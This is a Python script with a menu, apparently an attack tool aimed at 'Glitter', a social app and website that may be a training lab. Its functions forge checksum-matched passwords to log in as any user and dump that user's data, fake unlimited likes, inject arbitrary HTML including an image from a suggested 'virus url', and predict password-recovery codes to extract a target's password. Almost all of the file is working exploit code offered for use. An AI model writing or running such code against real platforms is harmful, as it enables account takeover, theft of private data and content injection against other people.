import glitter_utils as glt
from datetime import datetime
import requests

def get_info_about_user(username="get it myself", display=True):
    """
    gets all of the possible information about a specific user in the app
    
    parameters:
    username (str): the username of the user
    display (bool): whether to print info about the user
    
    returns:
    list: all of the possible information about the user
    """
    
    if username == "get it myself":
        username = input("enter username to hack: ")
    
    username_checksum = glt.ascii_checksum(username)
    open_socket, correct_checksum = glt.request_user_checksum(username)
    
    difference = correct_checksum - username_checksum
    fake_password = glt.least_chars_for_ascii_checksum(difference)
    
    response = glt.send_generic_app_message(f"""100#<gli&&er><"user_name":"{username}","password":"{fake_password}","enable_push_notifications":true>##""".replace("<", "{").replace(">", "}"),
                                        open_socket=open_socket)
    response = glt.send_generic_app_message(f"""110#<gli&&er>{correct_checksum}##""".replace("<", "{").replace(">", "}"),
                                        open_socket=open_socket)
    
    response = glt.parse_response_data(response[1][36:])
    
    if display:
        print(f"info about {username}:")
        
        for current_param in response:
            print(current_param.replace(":", ": "))
    
    return response

def infinite_likes_app(num_likes=-1, post_id=-1):
    """
    like post (thru my account)
    
    parameters:
    num_likes (int): number of likes to do
    post_id (int): the post id to like
    """
    
    if post_id == -1:
        post_id = glt.get_post_id_app()
    
    if num_likes == -1:
        num_likes = int(input("enter number of likes: "))
    
    for _ in range(num_likes):
        glt.like_post_app(post_id)

def infinite_likes_website(num_likes=-1, post_id=-1):
    if post_id == -1:
        post_id = glt.get_post_id_website()
    
    if num_likes == -1:
        num_likes = int(input("enter number of likes: "))
    
    for _ in range(num_likes):
        glt.like_post_website(post_id)

def html_modified_glit_website(username="---", password="---"):
    if username == "---":
        username = input("enter username: ")
    
    if password == "---":
        password = input("enter password: ")
    
    log_in_result = glt.authenticate_user_website(username, password)
    
    user_id = log_in_result[4][3:]
    user_screen_name = log_in_result[0][17:]
    user_avatar = log_in_result[1][7:]
    user_cookie = log_in_result[-1][8:]
    
    chosen_bg_color = input("choose background color (html color name): ")
    chosen_font_color = input("choose font color (html color name): ")
    
    normal_text = input("enter some text text: ")
    html_big_text = f"""<h1 style="font-size: 200%; color: {input("choose big font color (html color name): ")}">{input("enter big text: ")}</h1>"""
    html_image = f"""<img src="{input("choose image src to embed ( you can use a virus url ;) ) ")}"></img>"""
    
    content = f"""{normal_text}\n{html_big_text}\n{html_image}"""
    
    # Prepare the parameters for the GET request
    params = {
        "id": "-1",
        "feed_owner_id": user_id,
        "publisher_id": user_id,
        "publisher_screen_name": user_screen_name,
        "publisher_avatar": user_avatar,
        "background_color": chosen_bg_color,
        "date": datetime.utcnow().isoformat() + "Z",
        "content": content,
        "font_color": chosen_font_color
    }
    
    headers = {
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Sec-GPC": "1",
        "Referer": "http://glitter.org.il/home",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": f"sparkle={user_cookie}"
    }
    
    sub_url = "glit"

    response = glt.send_generic_website_message(headers, None, params, None, sub_url, method=requests.get)
    
    print("if it didnt crash up to now, probably succedded :)")

def get_user_password_website(username="---", screen_name="---"):
    """
    get user password from website version (waits for user to interact with post to extract)
    
    parameters:
    username (str): the username of the user
    screen_name (str): the screen name of the user
    
    returns:
    (str): the password of the user
    """
    if username == "---":
        username = input("enter target username: ")
    
    if screen_name == "---":
        screen_name = input("enter target screen name: ")
    
    found_id = glt.get_user_id_website(screen_name)
    data = f'"{username}"'
    
    # send a fake request for a code (i already have it)
    headers = {
        "Host": "glitter.org.il",
        "Connection": "keep-alive",
        "Content-Length": f"{len(data)}",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Sec-GPC": "1",
        "Origin": "http://glitter.org.il",
        "Referer": "http://glitter.org.il/password-recovery",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9"
    }
    
    response = glt.send_generic_website_message(headers, data, None, None, "password-recovery-code-request/", method=requests.post)
    
    generated_code = glt.make_password_recovery_code(found_id)
    print(f"generated code: {generated_code}")
    
    data = f"""["{username}","{generated_code}"]"""
    
    headers = {
        "Host": "glitter.org.il",
        "Connection": "keep-alive",
        "Content-Length": f"{len(data)}",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Sec-GPC": "1",
        "Origin": "http://glitter.org.il",
        "Referer": "http://glitter.org.il/password-recovery",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9"
    }
    
    
    response = glt.send_generic_website_message(headers, data, None, None, "password-recovery-code-verification/", method=requests.post)
    
    print(f"found password for {username}: {response.text}")

func_options = [None, get_info_about_user, infinite_likes_app, get_user_password_website, html_modified_glit_website, infinite_likes_website]

def print_menu():
    print("""
    app ---
    
    1: get info about user
    2: infinite likes
    
    website ---
    
    3: get user's password
    4: custom HTML glit
    5: infinite likes
    
    misc ---
    
    0: exit
    """)

def get_user_choice():
    choice = -1
    
    while choice < 0 or choice > len(func_options):
        choice = int(input("enter choice: "))
    
    return choice

def main():
    current_choice = -1
    
    while current_choice != 0:
        print_menu()
        current_choice = get_user_choice()
        if current_choice == 0:
            print("exiting...")
            break
        else:
            func_options[current_choice]()

if __name__ == "__main__":
    main()